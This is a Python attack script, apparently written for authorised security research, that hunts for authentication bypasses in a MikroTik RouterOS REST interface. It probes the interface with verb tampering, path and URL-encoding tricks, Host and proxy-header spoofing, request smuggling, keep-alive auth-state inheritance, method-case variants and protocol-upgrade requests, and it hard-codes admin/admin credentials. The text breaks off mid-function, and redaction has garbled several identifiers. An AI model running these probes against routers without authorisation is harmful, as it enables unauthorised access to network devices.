#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — HTTP Authentication Bypass Testing (www binary)
Phase 9, Novel Finding Hunt
Target: [REDACTED-INTERNAL-IP] ([REDACTED-CREDS])

Tests (~100 total):
  1.  HTTP Verb Tampering (~11 tests)
  2.  Path Normalization Bypass (~10 tests)
  3.  URL Encoding of Path (~8 tests)
  4.  Host Header Manipulation (~7 tests)
  5.  X-Forwarded-For / Proxy Header Injection (~8 tests)
  6.  HTTP Version Down[REDACTED] (~4 tests)
  7.  Request Smuggling (CL/TE, TE/CL, TE/TE) (~8 tests)
  8.  Connection Auth State Inheritance (~6 tests)
  9.  Partial URL / Path Confusion (~8 tests)
  10. Method Case Sensitivity (~10 tests)
  11. WebSocket Up[REDACTED] on REST (~4 tests)
  12. Double Authorization Header (~6 tests)
  13. Miscellaneous Bypass Vectors (~10+ tests)

Context:
  CVE-2023-41570 (REST API ACL bypass) was pristine-confirmed on this firmware.
  This script hunts for NEW auth bypass vectors in the www binary that handles
  HTTP/REST routing and authentication.

Evidence: evidence/attack_www_auth_bypass.json
"""

import base64
import json
import os
import socket
import ssl
import sys
import time
import traceback
import warnings
from datetime import datetime
from pathlib import Path

import requests
import urllib3

# Suppress SSL and urllib3 warnings globally
warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Shared module ────────────────────────────────────────────────────────────
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import (
    EvidenceCollector, log, EVIDENCE_DIR,
    check_router_alive, wait_for_router, pull_router_logs,
)

# ── Target Configuration (override for [REDACTED-INTERNAL-IP]) ──────────────────────────
TARGET = "[REDACTED-INTERNAL-IP]"
PORT = 80
AUTH = ("admin", "admin")
AUTH_USER = "admin"
AUTH_PASS = "admin"

# Override mikrotik_common TARGET for health checks and log pulling
import mikrotik_common
mikrotik_common.TARGET = TARGET
mikrotik_common.ADMIN_USER = AUTH_USER
mikrotik_common.ADMIN_PASS = AUTH_PASS

# ── Constants ────────────────────────────────────────────────────────────────
HTTP_BASE = f"http://{TARGET}"
REST_BASE = f"{HTTP_BASE}/rest"
PROTECTED_PATH = "/rest/system/resource"
PROTECTED_URL = f"{HTTP_BASE}{PROTECTED_PATH}"
TIMEOUT = 10

# Status code for authenticated vs unauthenticated baseline
BASELINE_AUTH_STATUS = None      # filled during preflight
BASELINE_NOAUTH_STATUS = None    # filled during preflight


# ── Helpers ──────────────────────────────────────────────────────────────────

def http_request(method, url, headers=None, auth=None, data=None,
                 timeout=TIMEOUT, allow_redirects=True):
    """Send an HTTP request via requests library. Returns response or None."""
    kwargs = {
        "timeout": timeout,
        "verify": False,
        "allow_redirects": allow_redirects,
    }
    if auth:
        kwargs["auth"] = auth
    if headers:
        kwargs["headers"] = headers
    if data is not None:
        kwargs["data"] = data
    try:
        return requests.request(method, url, **kwargs)
    except Exception:
        return None


def raw_socket_send(data_bytes, timeout=5):
    """Send raw bytes over a TCP socket to TARGET:PORT.
    Returns (response_bytes, error_string).
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, PORT))
        s.sendall(data_bytes)
        # Read response (up to 8KB)
        response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
                if len(response) > 8192:
                    break
            except socket.timeout:
                break
        s.close()
        return response, None
    except Exception as e:
        return b"", str(e)


def parse_raw_response(raw_bytes):
    """Parse raw HTTP response bytes into (status_code, headers_dict, body_str)."""
    try:
        text = raw_bytes.decode("utf-8", errors="replace")
    except Exception:
        text = str(raw_bytes)
    if not text or not text.startswith("HTTP"):
        return 0, {}, text
    try:
        header_part, _, body = text.partition("\r\n\r\n")
        status_line = header_part.split("\r\n")[0]
        # e.g. "HTTP/1.1 200 OK"
        parts = status_line.split(" ", 2)
        status_code = int(parts[1]) if len(parts) >= 2 else 0
        headers = {}
        for line in header_part.split("\r\n")[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip()] = v.strip()
        return status_code, headers, body
    except Exception:
        return 0, {}, text


def is_auth_bypass(status_code, body_text):
    """Return True if the response indicates successful access to a protected
    endpoint WITHOUT providing valid credentials.
    A 200 on /rest/system/resource with JSON body containing 'uptime' or
    'cpu-load' is strong evidence of bypass."""
    if status_code != 200:
        return False
    if not body_text:
        return False
    lower = body_text.lower()
    # RouterOS /rest/system/resource returns JSON with these fields
    return any(kw in lower for kw in ("uptime", "cpu-load", "free-memory",
                                       "board-name", "architecture-name"))


def result_str(status, body, bypass):
    """Short summary string for test result."""
    tag = "*** AUTH BYPASS ***" if bypass else "blocked"
    preview = body[:200].replace("\n", " ").replace("\r", "") if body else "(empty)"
    return f"Status {status}, {tag}, body={preview}"


def health_check(ec, label="periodic"):
    """Quick router health check. Returns True if alive."""
    try:
        r = requests.get(
            f"http://{TARGET}/rest/system/resource",
            auth=AUTH, timeout=5, verify=False)
        alive = r.status_code == 200
        if not alive:
            ec.add_test("health", f"Health check ({label})",
                        f"Router health check at {label}",
                        f"Status {r.status_code} — may be degraded",
                        anomaly=True)
        return alive
    except Exception:
        ec.add_test("health", f"Health check ({label})",
                    f"Router health check at {label}",
                    "Connection failed — router may be down", anomaly=True)
        wait_for_router(max_wait=30)
        return False


def basic_auth_header(user, password):
    """Generate a Basic auth header value."""
    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    return f"Basic {creds}"


# =============================================================================
# Section 1: HTTP Verb Tampering (~11 tests)
# =============================================================================

def test_http_verb_tampering(ec):
    """Test if non-standard HTTP methods bypass auth on protected endpoints."""
    log("=" * 60)
    log("Section 1: HTTP Verb Tampering")
    log("=" * 60)
    cat = "verb_tampering"

    verbs = [
        "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD",
        "OPTIONS", "TRACE", "CONNECT", "PROPFIND", "MKCOL",
    ]

    for verb in verbs:
        r = http_request(verb, PROTECTED_URL, timeout=TIMEOUT)
        if r is not None:
            body = r.text[:500]
            bypass = is_auth_bypass(r.status_code, body)
            ec.add_test(cat, f"Verb {verb} no-auth",
                        f"{verb} {PROTECTED_PATH} without credentials",
                        result_str(r.status_code, body, bypass),
                        {"method": verb, "status": r.status_code,
                         "body_preview": body, "auth_bypass": bypass,
                         "headers": dict(r.headers)},
                        anomaly=bypass)
            if bypass:
                ec.add_finding(
                    "CRITICAL",
                    f"Auth bypass via HTTP {verb} on {PROTECTED_PATH}",
                    f"Sending {verb} without credentials returns 200 with "
                    f"system resource data. The www binary does not enforce "
                    f"authentication for this HTTP method.",
                    cwe="CWE-287", cvss="9.8",
                    reproduction_steps=[
                        f"curl -X {verb} http://{TARGET}{PROTECTED_PATH}",
                    ])
        else:
            ec.add_test(cat, f"Verb {verb} no-auth",
                        f"{verb} {PROTECTED_PATH}", "Connection failed")


# =============================================================================
# Section 2: Path Normalization Bypass (~10 tests)
# =============================================================================

def test_path_normalization(ec):
    """Test if path normalization tricks bypass auth routing."""
    log("=" * 60)
    log("Section 2: Path Normalization Bypass")
    log("=" * 60)
    cat = "path_normalization"

    paths = [
        ("/rest//system/resource",              "double slash"),
        ("/rest/./system/resource",             "dot segment"),
        ("/rest/system/../system/resource",     "parent traversal to same"),
        ("/REST/system/resource",               "uppercase REST"),
        ("/Rest/System/Resource",               "mixed case"),
        ("/rest/system/resource/",              "trailing slash"),
        ("/rest/system/resource?",              "empty query string"),
        ("/rest/system/resource#fragment",      "fragment"),
        ("//rest/system/resource",              "leading double slash"),
        ("/rest\\system\\resource",             "backslash separator"),
    ]

    for path, desc in paths:
        url = f"http://{TARGET}{path}"
        r = http_request("GET", url, timeout=TIMEOUT)
        if r is not None:
            body = r.text[:500]
            bypass = is_auth_bypass(r.status_code, body)
            ec.add_test(cat, f"Path norm: {desc}",
                        f"GET {path} without auth — {desc}",
                        result_str(r.status_code, body, bypass),
                        {"path": path, "description": desc,
                         "status": r.status_code, "body_preview": body,
                         "auth_bypass": bypass},
                        anomaly=bypass)
            if bypass:
                ec.add_finding(
                    "CRITICAL",
                    f"Auth bypass via path normalization ({desc})",
                    f"GET {path} without credentials returns system resource "
                    f"data. Path normalization allows routing bypass.",
                    cwe="CWE-287", cvss="9.8",
                    reproduction_steps=[f"curl http://{TARGET}{path}"])
        else:
            ec.add_test(cat, f"Path norm: {desc}",
                        f"GET {path}", "Connection failed")


# =============================================================================
# Section 3: URL Encoding of Path (~8 tests)
# =============================================================================

def test_url_encoding(ec):
    """Test if URL-encoded paths bypass auth check."""
    log("=" * 60)
    log("Section 3: URL Encoding of Path")
    log("=" * 60)
    cat = "url_encoding"

    encoded_paths = [
        # Partial encoding of key path segments
        ("/rest/%73ystem/%72esource",                   "partial encode s->%73, r->%72"),
        ("/%72est/system/resource",                     "encode 'r' in rest"),
        ("/r%65st/system/resource",                     "encode 'e' in rest"),
        ("/rest/s%79stem/resource",                     "encode 'y' in system"),
        # Full percent-encoding of /rest/system/resource
        ("/%72%65%73%74/%73%79%73%74%65%6d/%72%65%73%6f%75%72%63%65",
                                                        "full encode all"),
        # Double encoding
        ("/rest/%2573ystem/resource",                   "double encode %73->%2573"),
        ("/rest/system/resource%00",                    "null byte suffix"),
        ("/rest/system/resource%20",                    "space suffix"),
    ]

    for path, desc in encoded_paths:
        # Use raw socket to prevent requests from normalizing the URL
        request_line = f"GET {path} HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n"
        raw_resp, err = raw_socket_send(request_line.encode())
        if err:
            ec.add_test(cat, f"URL encode: {desc}",
                        f"GET {path}", f"Socket error: {err}")
            continue

        status, headers, body = parse_raw_response(raw_resp)
        bypass = is_auth_bypass(status, body)
        ec.add_test(cat, f"URL encode: {desc}",
                    f"GET {path} without auth — {desc}",
                    result_str(status, body, bypass),
                    {"path": path, "description": desc,
                     "status": status, "body_preview": body[:500],
                     "auth_bypass": bypass},
                    anomaly=bypass)
        if bypass:
            ec.add_finding(
                "CRITICAL",
                f"Auth bypass via URL encoding ({desc})",
                f"GET {path} returns system resource data without auth.",
                cwe="CWE-287", cvss="9.8")


# =============================================================================
# Section 4: Host Header Manipulation (~7 tests)
# =============================================================================

def test_host_header(ec):
    """Test if manipulating the Host header bypasses auth or routing."""
    log("=" * 60)
    log("Section 4: Host Header Manipulation")
    log("=" * 60)
    cat = "host_header"

    host_values = [
        ("localhost",       "localhost"),
        ("127.0.0.1",       "loopback IPv4"),
        ("::1",             "loopback IPv6"),
        (TARGET,            "actual target IP"),
        ("internal",        "arbitrary internal name"),
        ("",                "empty host header"),
        ("evil.com",        "external domain"),
    ]

    for host_val, desc in host_values:
        request_lines = [
            f"GET {PROTECTED_PATH} HTTP/1.1",
        ]
        if host_val == "":
            request_lines.append("Host:")
        else:
            request_lines.append(f"Host: {host_val}")
        request_lines.append("Connection: close")
        request_lines.append("")
        request_lines.append("")
        raw_req = "\r\n".join(request_lines).encode()

        raw_resp, err = raw_socket_send(raw_req)
        if err:
            ec.add_test(cat, f"Host: {desc}",
                        f"GET with Host: {host_val}", f"Socket error: {err}")
            continue

        status, headers, body = parse_raw_response(raw_resp)
        bypass = is_auth_bypass(status, body)
        ec.add_test(cat, f"Host: {desc}",
                    f"GET {PROTECTED_PATH} with Host: {host_val!r}",
                    result_str(status, body, bypass),
                    {"host_value": host_val, "description": desc,
                     "status": status, "body_preview": body[:500],
                     "auth_bypass": bypass},
                    anomaly=bypass)
        if bypass:
            ec.add_finding(
                "CRITICAL",
                f"Auth bypass via Host header manipulation ({desc})",
                f"Setting Host: {host_val!r} bypasses authentication.",
                cwe="CWE-287", cvss="9.8")


# =============================================================================
# Section 5: X-Forwarded-For / Proxy Header Injection (~8 tests)
# =============================================================================

def test_forwarded_headers(ec):
    """Test if proxy/forwarding headers trick the server into trusting requests."""
    log("=" * 60)
    log("Section 5: X-Forwarded-For / Proxy Header Injection")
    log("=" * 60)
    cat = "forwarded_headers"

    header_sets = [
        ({"X-Forwarded-For": "127.0.0.1"},                 "XFF 127.0.0.1"),
        ({"X-Forwarded-For": "::1"},                        "XFF ::1"),
        ({"X-Real-IP": "127.0.0.1"},                        "X-Real-IP 127.0.0.1"),
        ({"X-Forwarded-Host": "localhost"},                  "X-Forwarded-Host localhost"),
        ({"Forwarded": "for=127.0.0.1"},                    "Forwarded for=127.0.0.1"),
        ({"X-Forwarded-For": "127.0.0.1",
          "X-Real-IP": "127.0.0.1",
          "X-Forwarded-Host": "localhost"},                  "all proxy headers combined"),
        ({"X-Original-URL": "/rest/system/resource"},        "X-Original-URL"),
        ({"X-Rewrite-URL": "/rest/system/resource"},         "X-Rewrite-URL"),
    ]

    for hdrs, desc in header_sets:
        r = http_request("GET", PROTECTED_URL, headers=hdrs, timeout=TIMEOUT)
        if r is not None:
            body = r.text[:500]
            bypass = is_auth_bypass(r.status_code, body)
            ec.add_test(cat, f"Proxy hdr: {desc}",
                        f"GET {PROTECTED_PATH} with {desc} (no auth)",
                        result_str(r.status_code, body, bypass),
                        {"headers_sent": hdrs, "description": desc,
                         "status": r.status_code, "body_preview": body,
                         "auth_bypass": bypass},
                        anomaly=bypass)
            if bypass:
                ec.add_finding(
                    "CRITICAL",
                    f"Auth bypass via proxy header injection ({desc})",
                    f"Adding {list(hdrs.keys())} headers bypasses auth.",
                    cwe="CWE-287", cvss="9.8")
        else:
            ec.add_test(cat, f"Proxy hdr: {desc}",
                        f"{desc}", "Connection failed")


# =============================================================================
# Section 6: HTTP Version Down[REDACTED] (~4 tests)
# =============================================================================

def test_http_version_down[REDACTED](ec):
    """Test if older HTTP protocol versions have different auth behavior."""
    log("=" * 60)
    log("Section 6: HTTP Version Down[REDACTED]")
    log("=" * 60)
    cat = "http_version"

    versions = [
        ("HTTP/1.0", "HTTP/1.0"),
        ("HTTP/1.1", "HTTP/1.1 (baseline)"),
        ("HTTP/0.9", "HTTP/0.9 (ancient)"),
        ("HTTP/2.0", "HTTP/2.0 (up[REDACTED] attempt)"),
    ]

    for ver, desc in versions:
        if ver == "HTTP/0.9":
            # HTTP/0.9: no headers, just GET path
            raw_req = f"GET {PROTECTED_PATH}\r\n".encode()
        else:
            raw_req = (
                f"GET {PROTECTED_PATH} {ver}\r\n"
                f"Host: {TARGET}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()

        raw_resp, err = raw_socket_send(raw_req)
        if err:
            ec.add_test(cat, f"Version: {desc}",
                        f"GET with {ver}", f"Socket error: {err}")
            continue

        status, headers, body = parse_raw_response(raw_resp)
        bypass = is_auth_bypass(status, body)
        ec.add_test(cat, f"Version: {desc}",
                    f"GET {PROTECTED_PATH} with {ver} (no auth)",
                    result_str(status, body, bypass),
                    {"version": ver, "description": desc,
                     "status": status, "body_preview": body[:500],
                     "auth_bypass": bypass,
                     "raw_response_preview": raw_resp[:500].decode("utf-8", errors="replace")},
                    anomaly=bypass)
        if bypass:
            ec.add_finding(
                "CRITICAL",
                f"Auth bypass via HTTP version down[REDACTED] ({ver})",
                f"Using {ver} bypasses authentication.",
                cwe="CWE-287", cvss="9.8")


# =============================================================================
# Section 7: Request Smuggling (~8 tests)
# =============================================================================

def test_request_smuggling(ec):
    """Test CL/TE, TE/CL, and TE/TE request smuggling."""
    log("=" * 60)
    log("Section 7: Request Smuggling (CL/TE, TE/CL, TE/TE)")
    log("=" * 60)
    cat = "request_smuggling"

    auth_hdr = basic_auth_header(AUTH_USER, AUTH_PASS)

    # ── 7.1  CL/TE: Content-Length says small, Transfer-Encoding: chunked
    #          hides a second request in the body
    smuggled_second = (
        f"GET {PROTECTED_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    chunked_body = (
        f"0\r\n"
        f"\r\n"
        f"{smuggled_second}"
    )
    cl_te_req = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Content-Length: {len(chunked_body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{chunked_body}"
    ).encode()

    raw_resp, err = raw_socket_send(cl_te_req, timeout=5)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    bypass = is_auth_bypass(status, body)
    ec.add_test(cat, "CL/TE smuggling",
                "POST with CL + TE:chunked, smuggled GET without auth",
                result_str(status, body, bypass),
                {"technique": "CL/TE", "status": status,
                 "body_preview": body[:500], "auth_bypass": bypass,
                 "raw_response": raw_resp[:500].decode("utf-8", errors="replace") if raw_resp else ""},
                anomaly=bypass)
    if bypass:
        ec.add_finding("CRITICAL", "Request smuggling auth bypass (CL/TE)",
                       "CL/TE request smuggling allows sending an unauthenticated "
                       "request that inherits the processing context.",
                       cwe="CWE-444", cvss="9.8")

    # ── 7.2  TE/CL: Transfer-Encoding first, then Content-Length override
    te_cl_body = (
        f"5\r\n"
        f"GET /\r\n"
        f"0\r\n"
        f"\r\n"
    )
    te_cl_req = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: 0\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{te_cl_body}"
    ).encode()

    raw_resp, err = raw_socket_send(te_cl_req, timeout=5)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    bypass = is_auth_bypass(status, body)
    ec.add_test(cat, "TE/CL smuggling",
                "POST with TE:chunked + CL:0, body has chunked data",
                result_str(status, body, bypass),
                {"technique": "TE/CL", "status": status,
                 "body_preview": body[:500], "auth_bypass": bypass},
                anomaly=bypass)

    # ── 7.3  TE/TE obfuscation: two Transfer-Encoding headers
    te_te_req = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Transfer-Encoding: identity\r\n"
        f"Content-Length: 0\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
    ).encode()

    raw_resp, err = raw_socket_send(te_te_req, timeout=5)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    ec.add_test(cat, "TE/TE obfuscation",
                "POST with two Transfer-Encoding headers (chunked + identity)",
                result_str(status, body, False),
                {"technique": "TE/TE", "status": status,
                 "body_preview": body[:500]})

    # ── 7.4  TE with weird spacing/casing
    te_variants = [
        ("Transfer-Encoding : chunked",    "TE with space before colon"),
        ("Transfer-Encoding: chunked ",    "TE with trailing space"),
        ("Transfer-Encoding:\tchunked",    "TE with tab"),
        ("Transfer-encoding: chunked",     "TE lowercase"),
        ("TRANSFER-ENCODING: chunked",     "TE uppercase"),
    ]
    for te_header, desc in te_variants:
        req = (
            f"POST {PROTECTED_PATH} HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"{te_header}\r\n"
            f"Content-Length: 0\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"0\r\n\r\n"
        ).encode()
        raw_resp, err = raw_socket_send(req, timeout=5)
        status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
        bypass = is_auth_bypass(status, body)
        ec.add_test(cat, f"TE variant: {desc}",
                    f"POST with {desc} (no auth)",
                    result_str(status, body, bypass),
                    {"variant": desc, "status": status,
                     "body_preview": body[:500], "auth_bypass": bypass},
                    anomaly=bypass)


# =============================================================================
# Section 8: Connection Auth State Inheritance (~6 tests)
# =============================================================================

def test_connection_auth_state(ec):
    """Test if an authenticated request on a keep-alive connection lets
    subsequent unauthenticated requests through."""
    log("=" * 60)
    log("Section 8: Connection Auth State Inheritance")
    log("=" * 60)
    cat = "conn_auth_state"

    auth_hdr = basic_auth_header(AUTH_USER, AUTH_PASS)

    # ── 8.1  HTTP/1.1 keep-alive: auth request then unauth on same socket
    first_req = (
        f"GET {PROTECTED_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Authorization: {auth_hdr}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    )
    second_req = (
        f"GET {PROTECTED_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET, PORT))

        # Send first (authenticated) request
        s.sendall(first_req.encode())
        time.sleep(0.5)

        # Read first response
        first_response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                first_response += chunk
                # Check if we got a complete response (look for double CRLF after headers,
                # then check Content-Length or chunked)
                if b"\r\n\r\n" in first_response:
                    # Simple heuristic: if we have the headers + some body, move on
                    break
            except socket.timeout:
                break

        first_status, _, first_body = parse_raw_response(first_response)

        ec.add_test(cat, "Keep-alive: first request (authed)",
                    f"GET {PROTECTED_PATH} with auth on keep-alive connection",
                    f"Status {first_status}",
                    {"status": first_status, "body_preview": first_body[:300]})

        # Send second (unauthenticated) request on same connection
        s.sendall(second_req.encode())
        time.sleep(0.5)

        second_response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                second_response += chunk
                if b"\r\n\r\n" in second_response:
                    break
            except socket.timeout:
                break

        s.close()

        second_status, _, second_body = parse_raw_response(second_response)
        bypass = is_auth_bypass(second_status, second_body)

        ec.add_test(cat, "Keep-alive: second request (NO auth)",
                    f"GET {PROTECTED_PATH} without auth on SAME connection",
                    result_str(second_status, second_body, bypass),
                    {"status": second_status, "body_preview": second_body[:500],
                     "auth_bypass": bypass,
                     "first_status": first_status},
                    anomaly=bypass)

        if bypass:
            ec.add_finding(
                "CRITICAL",
                "Auth state inheritance on keep-alive connection",
                "After an authenticated request on a keep-alive TCP connection, "
                "the next request without credentials also returns 200 with data. "
                "The www binary does not reset auth state between requests.",
                cwe="CWE-287", cvss="9.8",
                reproduction_steps=[
                    "Open TCP connection to port 80",
                    f"Send authenticated GET {PROTECTED_PATH}",
                    f"Send unauthenticated GET {PROTECTED_PATH} on same connection",
                    "Second request returns 200 with resource data",
                ])

    except Exception as e:
        ec.add_test(cat, "Keep-alive auth state test",
                    "TCP keep-alive auth inheritance", f"Error: {e}")

    # ── 8.2  Pipelined requests: auth + no-auth simultaneously
    pipelined = (first_req + second_req).encode()
    raw_resp, err = raw_socket_send(pipelined, timeout=5)
    if not err and raw_resp:
        # Try to split the two responses
        text = raw_resp.decode("utf-8", errors="replace")
        # Look for second HTTP response
        parts = text.split("HTTP/1.")
        if len(parts) >= 3:
            # parts[0] is empty/before first HTTP, parts[1] is first response,
            # parts[2] is second response
            second_part = "HTTP/1." + parts[2]
            s2_status, _, s2_body = parse_raw_response(second_part.encode())
            bypass = is_auth_bypass(s2_status, s2_body)
            ec.add_test(cat, "Pipelined: auth then no-auth",
                        "Pipeline authed + unauthed requests simultaneously",
                        result_str(s2_status, s2_body, bypass),
                        {"second_status": s2_status, "body_preview": s2_body[:500],
                         "auth_bypass": bypass, "response_count": len(parts) - 1},
                        anomaly=bypass)
        else:
            ec.add_test(cat, "Pipelined: auth then no-auth",
                        "Pipeline requests",
                        f"Only {len(parts)-1} response(s) received",
                        {"raw_preview": text[:500]})
    else:
        ec.add_test(cat, "Pipelined: auth then no-auth",
                    "Pipeline requests", f"Error: {err}")

    # ── 8.3  Reverse pipeline: no-auth then auth
    reverse_pipelined = (second_req + first_req).encode()
    raw_resp, err = raw_socket_send(reverse_pipelined, timeout=5)
    if not err and raw_resp:
        text = raw_resp.decode("utf-8", errors="replace")
        parts = text.split("HTTP/1.")
        if len(parts) >= 2:
            first_part = "HTTP/1." + parts[1].split("HTTP/1.")[0] if "HTTP/1." in parts[1] else "HTTP/1." + parts[1]
            s1_status, _, s1_body = parse_raw_response(first_part.encode())
            ec.add_test(cat, "Reverse pipeline: no-auth then auth",
                        "Pipeline unauthed + authed requests (reversed)",
                        f"First (unauthed) status: {s1_status}",
                        {"first_status": s1_status, "body_preview": s1_body[:500],
                         "response_count": len(parts) - 1})
        else:
            ec.add_test(cat, "Reverse pipeline: no-auth then auth",
                        "Reverse pipeline", "No parseable response",
                        {"raw_preview": raw_resp[:500].decode("utf-8", errors="replace")})
    else:
        ec.add_test(cat, "Reverse pipeline: no-auth then auth",
                    "Reverse pipeline", f"Error: {err}")

    # ── 8.4  Session with requests library: auth then remove auth
    s = requests.Session()
    r1 = s.get(PROTECTED_URL, auth=AUTH, timeout=TIMEOUT, verify=False)
    # Now remove auth and try again on same session (connection pool)
    r2 = s.get(PROTECTED_URL, timeout=TIMEOUT, verify=False)
    if r1 and r2:
        bypass = is_auth_bypass(r2.status_code, r2.text)
        ec.add_test(cat, "Session lib: auth then drop auth",
                    "requests.Session: authed GET then unauthed GET",
                    result_str(r2.status_code, r2.text, bypass),
                    {"first_status": r1.status_code,
                     "second_status": r2.status_code,
                     "body_preview": r2.text[:500],
                     "auth_bypass": bypass},
                    anomaly=bypass)


# =============================================================================
# Section 9: Partial URL / Path Confusion (~8 tests)
# =============================================================================

def test_partial_url_matching(ec):
    """Test path confusion via prefix/suffix manipulation."""
    log("=" * 60)
    log("Section 9: Partial URL / Path Confusion")
    log("=" * 60)
    cat = "path_confusion"

    paths = [
        ("/restx/../rest/system/resource",          "restx + parent traversal"),
        ("/rest.html/../rest/system/resource",      "rest.html + parent traversal"),
        ("/../rest/system/resource",                "root parent traversal"),
        ("/rest/system/resource;.json",             "semicolon extension"),
        ("/rest/system/resource.json",              ".json extension"),
        ("/rest/system/resource%23",                "encoded hash"),
        ("/api/rest/system/resource",               "/api prefix"),
        ("/v1/rest/system/resource",                "/v1 prefix"),
    ]

    for path, desc in paths:
        # Use raw socket to prevent normalization
        raw_req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        raw_resp, err = raw_socket_send(raw_req, timeout=5)
        if err:
            ec.add_test(cat, f"Path confusion: {desc}",
                        f"GET {path}", f"Socket error: {err}")
            continue

        status, headers, body = parse_raw_response(raw_resp)
        bypass = is_auth_bypass(status, body)
        ec.add_test(cat, f"Path confusion: {desc}",
                    f"GET {path} without auth — {desc}",
                    result_str(status, body, bypass),
                    {"path": path, "description": desc,
                     "status": status, "body_preview": body[:500],
                     "auth_bypass": bypass},
                    anomaly=bypass)
        if bypass:
            ec.add_finding(
                "CRITICAL",
                f"Auth bypass via path confusion ({desc})",
                f"GET {path} returns system resource data without auth.",
                cwe="CWE-287", cvss="9.8")


# =============================================================================
# Section 10: Method Case Sensitivity (~10 tests)
# =============================================================================

def test_method_case_sensitivity(ec):
    """Test if the www binary treats HTTP methods case-sensitively for auth."""
    log("=" * 60)
    log("Section 10: Method Case Sensitivity")
    log("=" * 60)
    cat = "method_case"

    methods = [
        "get", "Get", "gEt", "gET", "GEt", "GeT", "geT",
        "post", "Post", "pOsT",
    ]

    for method in methods:
        raw_req = (
            f"{method} {PROTECTED_PATH} HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        raw_resp, err = raw_socket_send(raw_req, timeout=5)
        if err:
            ec.add_test(cat, f"Method case: {method!r}",
                        f"{method} {PROTECTED_PATH}", f"Socket error: {err}")
            continue

        status, headers, body = parse_raw_response(raw_resp)
        bypass = is_auth_bypass(status, body)
        ec.add_test(cat, f"Method case: {method!r}",
                    f"{method} {PROTECTED_PATH} without auth",
                    result_str(status, body, bypass),
                    {"method": method, "status": status,
                     "body_preview": body[:500], "auth_bypass": bypass},
                    anomaly=bypass)
        if bypass:
            ec.add_finding(
                "CRITICAL",
                f"Auth bypass via case-variant method '{method}'",
                f"Using '{method}' instead of 'GET' bypasses authentication.",
                cwe="CWE-178", cvss="9.8")


# =============================================================================
# Section 11: WebSocket Up[REDACTED] on REST (~4 tests)
# =============================================================================

def test_websocket_up[REDACTED](ec):
    """Test if WebSocket up[REDACTED] requests bypass auth on REST endpoints."""
    log("=" * 60)
    log("Section 11: WebSocket Up[REDACTED] on REST Endpoints")
    log("=" * 60)
    cat = "websocket_up[REDACTED]"

    ws_headers_sets = [
        {
            "Up[REDACTED]": "websocket",
            "Connection": "Up[REDACTED]",
            "Sec-WebSocket-Key": base64.b64encode(b"0123456789ABCDEF").decode(),
            "Sec-WebSocket-Version": "13",
        },
        {
            "Up[REDACTED]": "websocket",
            "Connection": "Up[REDACTED], keep-alive",
            "Sec-WebSocket-Key": base64.b64encode(b"test-ws-key-1234").decode(),
            "Sec-WebSocket-Version": "13",
            "Origin": f"http://{TARGET}",
        },
        {
            "Up[REDACTED]": "h2c",
            "Connection": "Up[REDACTED], HTTP2-Settings",
            "HTTP2-Settings": base64.b64encode(b"\x00").decode(),
        },
        {
            "Up[REDACTED]": "TLS/1.0",
            "Connection": "Up[REDACTED]",
        },
    ]

    descs = [
        "standard WebSocket up[REDACTED]",
        "WebSocket with Origin header",
        "h2c (HTTP/2 cleartext) up[REDACTED]",
        "TLS up[REDACTED] via Up[REDACTED] header",
    ]

    for hdrs, desc in zip(ws_headers_sets, descs):
        r = http_request("GET", PROTECTED_URL, headers=hdrs, timeout=TIMEOUT)
        if r is not None:
            body = r.text[:500]
            bypass = is_auth_bypass(r.status_code, body)
            # Also check for 101 Switching Protocols
            switching = r.status_code == 101
            ec.add_test(cat, f"Up[REDACTED]: {desc}",
                        f"GET {PROTECTED_PATH} with {desc} (no auth)",
                        result_str(r.status_code, body, bypass or switching),
                        {"description": desc, "status": r.status_code,
                         "body_preview": body,
                         "upgrade_headers": hdrs,
                         "switching_protocols": switching,
                         "auth_bypass": bypass},
                        anomaly=bypass or switching)
            if bypass:
                ec.add_finding(
                    "CRITICAL",
                    f"Auth bypass via {desc}",
